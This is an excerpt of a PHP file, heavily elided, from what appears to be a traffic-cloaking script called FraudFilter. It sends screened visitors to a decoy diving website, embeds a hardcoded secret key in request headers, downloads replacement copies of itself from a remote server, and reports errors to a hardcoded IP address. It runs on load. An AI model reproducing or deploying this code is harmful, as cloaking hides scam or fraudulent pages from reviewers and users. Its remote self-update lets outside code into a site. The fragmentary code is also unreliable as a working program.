...
class FraudFilterDetector_dqum8 {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'af39d508-9845-40fe-98f2-d89064fafa9e.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('http://www.scubadivingjersey.com');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: af39d508-9845-40fe-98f2-d89064fafa9e',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: af39d508-9845-40fe-98f2-d89064fafa9e';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: af39d508-9845-40fe-98f2-d89064fafa9e';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=dqum8&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_dqum8 = new FraudFilterDetector_dqum8();
$fraudFilterDetector_dqum8->check();
